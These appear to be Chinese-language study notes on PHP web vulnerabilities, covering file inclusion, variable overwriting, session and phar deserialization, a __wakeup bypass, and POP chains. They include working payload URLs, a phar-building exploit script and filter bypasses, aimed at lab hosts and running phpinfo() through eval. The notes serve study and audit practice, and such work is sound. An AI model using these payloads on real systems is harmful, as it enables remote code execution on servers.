+http://127.0.0.1/include.php?file=data://text/plain,<?php%20phpinfo();?>
+
+eg2：
+http://127.0.0.1/include.php?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
+其中：
+<?php phpinfo();?>经过base64编码为：PD9waHAgcGhwaW5mbygpOz8+
+再将其进行url编码(仅将除数字、字母之外的其他特殊字符url编码即可)得到：
+PD9waHAgcGhwaW5mbygpOz8%2B      //url编码不区分大小写.
+故payload为：
+http://127.0.0.1:90/q.php?filew=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B
+
+
+
+
+
+审计xhcms：
+搜索include->审计index.php-->发现：
+include('files/'.$action.'.php');
+目录穿越+文件包含漏洞。
+payload：
+GET /?r=../install/index HTTP/1.1
+
+修复：白名单：
+$arr_white=array('about','contact','content','download','pages','submit');
+if (in_array($action, $arr_white)){
+    echo "yes===========";
+    include('files/'.$action.'.php'); //载入相应文件
+}
+
+
+include等包含文件相当于直接将目标文件的php代码复制到此处，故如：
+system("pwd");  显示的是php服务器端(web服务器)的主机当前路径，和目标文件没任何关系.
+
+
+
+
+
+防御文件上传：黑白名单、文件或账户权限控制.
+
+
+
+
+
+
+变量覆盖：常见于CTF.
+register_globals利用条件：
+1. php<5.4.0
+2. php.ini配置：
+register_globals=On
+
+
+审计cmseasy：
+
+
+php源码加密：
+1.无扩展加密：使用php内置的函数进行编码、混淆、加密等.
+常见函数：eval、gzinflate、base64_decode、urldecode、gzuncompress
+
+还原方式：
+解码、复原变量名(变量替换)和字符串、hook eval等关键或明文函数、动态调试、var_dump()等输出关键信息.
+$filez=file_get_contents(__FILE__);     获取当前文件并按某个区间substr().
+若如此，则变量名替换就不太行.
+
+动态调试也不太好分析，因为都在一行，你不能添加换行符(否则长度变化了).
+
+php一般支持各种编码运行.
+
+
+常用的还原方式：eval改为echo.
+再将其直接作为php代码运行即可.
+
+
+
+
+2.扩展加密：需加载第三方模块，通过拓展对源码进行AES、DES加密，运行时解密.
+
+还原方式：
+确定算法后解密、hook zend_compile_file函数、动态调试.
+
+zend虚拟机：将php转换为底层代码C语言再运行.
+
+
+
+
+变量覆盖：常见于ctf中.
+register_globals使用：需php<5.4.0
+
+register_globals=On     //将接收的参数注册为全局变量.
+
+
+eg1：使用：http://10.17.185.205:91/demo1.php?cmdq=kwdkq
+<?php
+$qw1=$_GET[cmdq];
+var_dump($_GET[cmdq]);echo "<br>";
+var_dump($qw1);echo "<br>";
+var_dump($cmdq);echo "<br>";    //若register_globals=On，则输出kwdkq；否则输出NULL.
+?>
+
+
+
+
+
+extract()函数将数组中的元素按key->value的方式注册为变量.
+eg1：即使register_globals=Off也会生效.
+<?php
+$w1="origizn";
+$qz=array('w1'=>'z1','w2'=>'z2','w3'=>'z3');
+var_dump($w1);  //输出string(7) "origizn"
+extract($qz);
+var_dump($w1);  //输出string(2) "z1"
+?>
+
+
+
+parse_str()函数将查询字符串解析到变量中.
+eg1：
+<?php
+$namwe="yuanshiz";
+var_dump($namwe);
+parse_str("namwe=Peter&agze=43");
+echo $namwe."<br>";         //为Peter    变量覆盖.
+var_dump($agze);            //为string(2) "43"
+?>
+
+
+
+
+
+import_request_variables函数将GET、POST、Cookie变量导入到全局作用域中(即注册为全局变量).
+import_request_variables使用条件：
+4.1.0<=php_v<=5.4.0
+
+eg1：
+<?php
+import_request_variables("gP", "runoob_");
+var_dump($runoob_foo);
+?>
+分析：
+G表示GET、P表示POST、C表示Cookie，它们不区分大小写且可任意组合.
+runoob_表示要注册的变量前缀.
+使用：
+访问http://10.17.185.205:91/demo1.php?foo=wdkkqz
+则var_dump($runoob_foo);     输出string(6) "wdkkqz"
+
+
+
+
+
+eg1：
+<?php
+$w1="testq";
+$$w1="testw";
+var_dump($$w1);         //输出string(5) "testw"
+var_dump($testq);       //与$$w1等效，输出string(5) "testw"
+//$$w1是一个引用变量，获取$w1的值，将其作为变量名.
+?>
+
+php反序列化形成条件：
+1.反序列化(unserialize())的字符串利用者可控.
+2.服务器端环境中存在可利用的class和魔术方法.
+3.phar文件可以在无unserialize()函数的情况下，实现反序列化.
+
+
+序列化：将对象转化为规整的字符串以便存储.
+反序列化：将规整的字符串转化为对象到内存中以便使用.
+
+
+php常见魔术方法：
+__construct()   //构造函数
+__destruct()    //析构函数：某个对象的所有引用都被删除或当对象被显示销毁时执行.
+
+方法重载：在对象中调用一个无权访问或不存在方法时，__call()会被调用.
+__call()
+如：
+public function __call($namwe, $argumentqs) 
+    {
+        echo "Calling object method '$namwe' "
+             . implode(', ', $argumentqs). "\n";
+    }
+
+
+
+
+
+方法重载：在静态上下文中调用一个无权访问或不存在方法时，__callStatic()会被调用.
+__callStatic()
+如：
+Methodz::runTetsz('adkw  sgdz');
+
+
+
+属性重载：读取不可访问(protected或private)或不存在的属性的值时，__get()会被调用.
+__get()
+如：
+public function __get($akdkwkq){
+        return "kzzzxxxxx-".$akdkwkq."-endz";
+}
+
+
+属性重载：给不可访问(protected或private)或不存在的属性赋值时，__set()会被调用.
+__set()
+如：
+public function __set($wp1,$wp2){
+        print("kais shiezhi!-".$wp1."-".$wp2."-fendz");
+}
+$t1->testadwz="zzmdw";
+
+
+当一个类的实例被当作字符串使用时调用__toString()函数，该函数必须返回一个字符串.
+__toString()
+如：
+public function __toString(){
+        print("=============k1========="."<br>");
+        return "zifuczw";
+}
+$t1=new w1();
+echo ($t1);
+
+
+
+当执行序列化操作(如serialize()函数)时，会先检查该类是否存在__sleep()函数，若存在该方法，则先调用该方法再执行序列化操作.
+返回值为array类型.
+__sleep()
+
+
+当执行反序列化操作(如unserialize()函数)时，会先检查该类是否存在__wakeup()函数，若存在该方法，则先调用该方法再执行反序列化操作.
+返回void.
+__wakeup()
+
+
+
+
+
+当对不可访问(protected或private)或不存在的属性调用isset()或empty()时，__isset()会被调用。
+public __isset(string $name): bool
+如：
+public function __isset($qname){
+        print("============w3=====".$qname."=");
+        //return "============w3=====akdkdqwwz="
+}
+$t1=new w1();
+isset($t1->akdkdqwwz);      //isset()函数，判断该变量是否有被设置.
+
+
+
+
+当对不可访问(protected或private)或不存在的属性调用unset()时，__unset()会被调用。
+public __unset(string $name): void
+如：
+public function __unset($qname){
+        print("============w3=====".$qname."=");
+        //return "============w3=====akdkdqwwz="
+}
+$t1=new w1();
+unset($t1->akdkdqwwz);      //unset()函数，销毁指定变量.
+
+
+
+
+当尝试以调用函数的方式调用一个对象时，__invoke()方法会被自动调用。
+__invoke( $... = ?): mixed
+如：
+class CallableClass 
+{
+    function __invoke($x) {
+        var_dump($x);
+    }
+}
+$obj = new CallableClass;
+$obj(5);
+
+
+
+
+这两个魔术方法当php>=7.4.0时可用，且若还定义了__sleep()或__wakeup()，则以下函数优先级更高(即执行以下函数忽略__sleep()或__wakeup()函数).
+public __serialize(): array
+public __unserialize(array $data): void
+
+
+
+
+序列化常见payload：
+class w1{
+    private $hidenz="phpinfo();";
+
+}
+$jwqz=new w1();
+echo urlencode(serialize($jwqz));   //因为有特殊字符，故最好使用php自带的函数进行url编码.
+
+注：特殊原字符为空字符(Null)，其16禁止表示为\x00  十进制表示为0
+其url编码后为%00
+
+
+
+
+
+
+
+
+
+
+反序列化三种属性格式：
+private：
+%00类名%00属性名
+
+protected：
+%00*%00属性名
+
+public：原型
+如：
+O:2:"w1":1:{s:6:"hidenz";s:10:"phpinfo();";}
+
+方法不会被序列化.
+
+
+
+
+序列化后的结构：
+String:     s:字符串长度:"字符串值";
+如：
+public $hidenz="phpinfo();";
+序列化后为：
+s:6:"hidenz";s:10:"phpinfo();";
+
+private $hidenz="phpinfo();";
+序列化后为：
+s:10:"�w1�hidenz";s:10:"phpinfo();";
+其中�为%00
+
+
+
+
+Integer:    i:数值;
+如：
+public $jsdw=324;
+序列化后为：
+s:4:"jsdw";i:324;
+
+
+Boolean:
+如：
+public $hw=true;
+序列化后为：
+s:2:"hw";b:1;
+
+
+Null:
+如：
+public $hw=null;
+序列化后为：
+s:2:"hw";N;
+
+
+
+
+array:
+如：
+public $hw=array(
+    "u1"=>"kw",
+    "u2"=>true,
+    "u3"=>995,
+    "u4"=>"adqwz",
+);
+序列化后为：
+s:2:"hw";a:4:{s:2:"u1";s:2:"kw";s:2:"u2";b:1;s:2:"u3";i:995;s:2:"u4";s:5:"adqwz";}
+
+
+
+object:
+如：
+<?php
+class w1{
+    public $hidenz="phpinfwz";
+    public $hw=array(
+        "u1"=>"kw",
+        "u2"=>true,
+        "u3"=>995,
+        "u4"=>"adqwz",
+    );
+}
+$jwqz=new w1();
+echo (serialize($jwqz));
+?>
+序列化后为：
+O:2:"w1":2:{s:6:"hidenz";s:8:"phpinfwz";s:2:"hw";a:4:{s:2:"u1";s:2:"kw";s:2:"u2";b:1;s:2:"u3";i:995;s:2:"u4";s:5:"adqwz";}}
+
+
+
+
+
+
+
+
+
+
+
+
+
+$hidwqenz=array(
+    'wdq'=>"padwhpinfo",
+    'wd2'=>345,
+);
+$hwq=json_encode($hidwqenz);
+echo ($hwq);    //输出{"wdq":"padwhpinfo","wd2":345}
+
+
+json_encode()实现序列化，一种简单特殊的序列化，不能和前面的serialize()混用.
+
+
+
+
+
+
+
+php常见序列化方式：
+1.文本序列化，如：json、serialize、xml等.
+2.二进制序列化，如：msgpack、protobuf、thrift等.
+
+
+用法：
+serialize用法：
+serialize()             //序列化方法
+unserialize()           //反序列化方法
+
+json用法：
+json_encode()   
+json_decode()   
+
+jsond用法：
+jsond_encode()  
+jsond_decode()
+
+msgpack用法：
+msgpack_pack()          //序列化方法
+msgpack_unpack()        //反序列化方法
+
+xml用法：
+wddx_serialize_value()  //序列化方法
+wddx_deserialize()      //反序列化方法
+
+
+eg1：
+$datwa=array(
+    'Name'=>'Byron','Age'=>24,'Friends'=>array('Casper','Frank','Vincent')
+);
+$xmzl=wddx_serialize_value($datwa); //将数组序列化为xml字符串
+echo $xmzl.'<br/>';
+$ouz=wddx_deserialize($xmzl);   //将xml字符串反序列化为数组
+var_dump($ouz);
+
+
+
+
+php反序列化利用方式：
+1. session反序列化：
+PHP_SESSION反序列化漏洞：主要是处理session不一致造成的.
+
+php处理器：php
+存储格式：
+键名+竖线+经过serialize()函数序列化后的值
+
+php_binary：
+键名的长度对应的ascii字符+键名+经过serialize()函数序列化后的值
+
+php_serialize(php>=5.5.4)：
+经过serialize()函数序列化后的数组
+
+
+
+
+案例1：
+server_code：
+--------1s----------
+<?php
+error_reporting(0);
+ini_set('session.serialize_handler','php');
+session_start();
+$_SESSION['session'] = $_GET['sessioqn'];
+?>
+--------1e----------
+
+访问：
+http://10.17.187.16:91/q1.php?sessioqn=wkdkqwzrwerq
+
+PHPSESSID   feuim5a9mjrtcllkgq073kbjv6
+
+Cookie: PHPSESSID=feuim5a9mjrtcllkgq073kbjv6
+
+sess_feuim5a9mjrtcllkgq073kbjv6文件
+内容为：
+session|s:12:"wkdkqwzrwerq";
+
+
+
+案例2：
+server_code：
+--------1s----------
+<?php
+error_reporting(0);
+ini_set('session.serialize_handler','php_binary');
+session_start();
+$_SESSION['sessionsessionsessionsessionsession'] = $_GET['sessiozn'];
+?>
+--------1e----------
+此键值长度为35
+其对应的ascii字符为#
+
+
+访问：
+http://10.17.187.16:91/q1.php?sessiozn=wkdkqwzrwerq
+
+PHPSESSID   9v3d2h264vdi3b4rg4ls9mejq0
+
+Cookie: PHPSESSID=9v3d2h264vdi3b4rg4ls9mejq0
+
+sess_9v3d2h264vdi3b4rg4ls9mejq0文件
+内容为：
+#sessionsessionsessionsessionsessions:12:"wkdkqwzrwerq";
+
+
+
+
+
+案例3：
+server_code：
+--------1s----------
+<?php
+error_reporting(0);
+
+//设置session的存储方式.   此文件的使用会覆盖master value中的值.
+ini_set('session.serialize_handler','php_serialize');   
+
+session_start();
+$_SESSION['session'] = $_GET['sessiowkqzn'];
+?>
+--------1e----------
+
+访问：
+http://10.17.187.16:91/q1.php?sessiowkqzn=wkdkqwzrwerq
+
+PHPSESSID   b093c254a162322d95d6b9314dc9614e
+
+Cookie: PHPSESSID=b093c254a162322d95d6b9314dc9614e
+
+sess_b093c254a162322d95d6b9314dc9614e文件
+内容为：
+a:1:{s:7:"session";s:12:"wkdkqwzrwerq";}
+
+
+
+
+
+
+$sjdjwd=array_map("myfunction",$w2);    
+var_dump($sjdjwd);  //array_map()返回array类型.
+
+
+
+
+
+
+
+
+
+
+php的local value和master value：
+master value：主要是php.ini中设置的值，php启动时生效，发生在执行任何php代码之前.
+local value：调用执行php时当前实际有效的值. 主要是通过调用、读取httpd.conf或.htaccess中的值. 其会覆盖master value中的值.
+
+
+
+
+
+php.ini中的重要配置：
+session.save_path=""        //设置session的存储位置
+如：session.save_path = "D:\phpstudy\Extensions\tmp\tmp"
+
+session.auto_start          //指定会话模块是否在请求开始时启动一个会话，默认值为0，不启动
+如：session.auto_start = 0
+
+session.save_handler = files    //设置session以文件的方式来进行存储
+
+session.serialize_handler   //设置用来序列化/反序列化的处理器名字，默认使用php
+如：session.serialize_handler = php
+
+session.upload_progress.enabled     //启用上传进度跟踪，并填充$ _SESSION变量，默认启用
+如：session.upload_progress.enabled on
+
+session.upload_progress.cleanup     //读取所有POST数据(即完成上传)后，立即清理进度信息，默认启用
+如：session.upload_progress.cleanup on
+
+
+
+
+
+
+
+
+cookie和session：
+cookie保存在客户端，基于http无状态协议.
+session保存在服务器端，有状态. 相比cookie而言，session有效期更短.
+
+session的有状态：
+服务器端生成对应的session_id，将其放在cookie中。 再将其取出与服务器端的session_id进行对比，故成功实现有状态，判断出用户.
+
+
+
+
+
+题目1：
+server_p1.php:
+---------1s----------
+<?php
+error_reporting(0);
+ini_set('session.serialize_handler','php_serialize');   
+session_start();
+$_SESSION['session'] = $_GET['usernamez'];
+phpinfo();
+?>
+----------1e-----------
+
+
+server_p2.php:
+---------1s----------
+<?php
+ini_set('session.serialize_handler','php'); 
+session_start();
+class A{
+    public $testw;
+    function __wakeup(){
+        eval($this->testw);
+    }
+}
+?>
+----------1e-----------
+
+payload：
+<?php
+class A{
+    public $testw="phpinfo();";
+}
+$sdw=new A();
+echo serialize($sdw);
+?>
+生成序列化代码：
+O:1:"A":1:{s:5:"testw";s:10:"phpinfo();";}
+
+访问：
+http://10.17.187.16:91/q1.php?usernamez=|O:1:%22A%22:1:{s:5:%22testw%22;s:10:%22phpinfo();%22;}
+也可url编码.
+
+再访问：
+http://10.17.187.16:91/q2.php
+成功执行.
+
+分析：
+q2.php中读取了session文件，输出sesison为：
+array(1) { ["a:1:{s:7:"session";s:43:""]=> object(A)#1 (1) { ["testw"]=> string(10) "phpinfo();" } } 
+
+
+
+
+
+
+
+题目2：
+phar文件：php压缩文件.
+
+phar文件组成结构：
+stub：为phar的文件标识，格式为xxx<?php xxx; __HALT_COMPILER();?>;      //其中xxx表示随便写.
+manifest：即meta-data，包含压缩文件的属性等信息，以序列化方式存储。该值可自定义(即可控).
+contents：压缩文件的内容
+signature：签名，放在文件末尾
+
+当文件操作函数以phar://伪协议解析phar文件时就会将phar文件的meta-data部分 进行反序列化.
+
+
+利用条件：
+1. php.ini中需设置phar.readonly=Off
+2. php_version>=5.3.0
+3. 调用受影响的函数.
+4. 参数可控且phar等特殊字符没被过滤.
+5. phar文件能上传至服务器.
+
+
+
+
+
+
+php的大部分函数通过phar://协议解析phar文件时，都会将meta-data部分 进行反序列化.
+一般有：
+fileatime、file_put_contents、fileinode、is_dir、is_readable、copy、filectime、file、filetime、is_executable、is_writeable、unlink、file_exists、filegroup、fileowner、is_file、is_readable、stat、file_get_contents、fopen、fileperms、is_link、parse_ini_file、readfile
+
+
+
+配置：
+php.ini中设置phar.readonly=Off
+
+
+
+server_code：
+------------1s----------
+<?php
+error_reporting(0);
+//ini_set('session.serialize_handler','php_serialize');     
+//session_start();
+class TestwObject {
+    public $adw="qwkwz";
+    public function __wakeup(){
+        print("start run");
+        @eval($this->adw);
+    }
+}
+
+//eg1：
+$filenamwe='phar://phawr.phar/tesqt.txt';   //访问、解压phar文件，执行反序列化操作.
+file_get_contents($filenamwe);
+
+//或
+//eg2：
+//$filenamwe=$_GET[filenamez];  //访问、解压phar文件，执行反序列化操作.
+//file_exists($filenamwe);
+//访问：http://10.17.187.16:91/q1.php?filenamez=phar://phawr.phar/teadadsqt.txt
+//或访问：http://10.17.187.16:91/q1.php?filenamez=phar://phawr.phar/tesqt.txt
+?>
+-------------1e----------
+
+
+
+本地代码：
+----------------1s-----------------
+<?php
+    class TestwObject{
+        public $adw="phpinfo();";
+    }   //要攻击或序列化的类
+    @unlink("phawr.phar");  //删除phawr.phar文件
+    $phazr = new Phar("phawr.phar");    //创建phawr.phar文件
+    $phazr->startBuffering();
+    $phazr->setStub("akdkwdw  dsfdgdg<?php akskdkwd ad adwdw q wzzz __HALT_COMPILER(); ?>");    //设置stub
+    $wkz = new TestwObject();
+    $phazr->setMetadata($wkz);  //将自定义的meta-data存入manifest 此为核心，存放序列化后的payload.
+    $phazr->addFromString("tesqt.txt", "teskwqzt");     //tesqt.txt文件有没有无所谓
+
+    //签名自动计算
+    $phazr->stopBuffering();
+?>
+----------------1e-----------------
+本地生成phawr.phar文件.
+
+
+上传phawr.phar文件，且使其被访问到.
+
+
+
+$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
+
+
+
+
+过滤phar://协议的绕过方式：
+compress.bzip2://phar://
+如：$z = 'compress.bzip2://phar:///home/sx/test.phar/test.txt';
+compress.zlib://phar://
+php://filter/resource=phar://
+
+
+
+
+cve-2016-7124：__wakeup()绕过:
+原理：
+反序列化时，若表示对象属性的个数的值大于实际的属性个数时，则会跳过__wakeup()函数的执行.
+
+利用条件：
+PHP5<5.6.25
+PHP7<7.0.10
+
+如：
+http://10.17.187.16:91/q1.php?cmdw=O:4:%22Demo%22:1:{s:4:%22file%22;s:9:%22flagz.txt%22;}
+改为：
+http://10.17.187.16:91/q1.php?cmdw=O:4:%22Demo%22:6:{s:4:%22file%22;s:9:%22flagz.txt%22;}
+绕过__wakeup()函数，执行成功.
+
+
+
+
+
+
+
+对象注入：
+POP：面向过程编程.
+寻找触发反序列化的调用链(A->B->C)，先定尾(最终调用的函数)后定头(可控输入点).
+
+
+
+本地序列化时，对最终的序列化字符串而言，没有用到的函数或属性等代码都可以删掉.
+
+分析方式：
+值：
+get_flagw()->__toString()->__invoke() ->  __call() -> test1() -> __destruct()
+
+属性：
+class stringq::$this->str1[C_getflagz] -> class zfuncw::$this->modz1[C_stringq]
+-> class zfunc::$this->modz1[C_zfuncw] -> class zcall::$this->modz1[C_zfunc]
+-> class start_gw::$this->modz1[C_zcall]
+
+
+
+
+发序列化中为了避免信息丢失，最好使用S来表示类型. 大写的S支持将后面的字符串用16进制表示(小写的s不支持)。
+如：
+s:4:"user"->S:4:"user"->S:4:"use\72"
+其中r的16进制为72
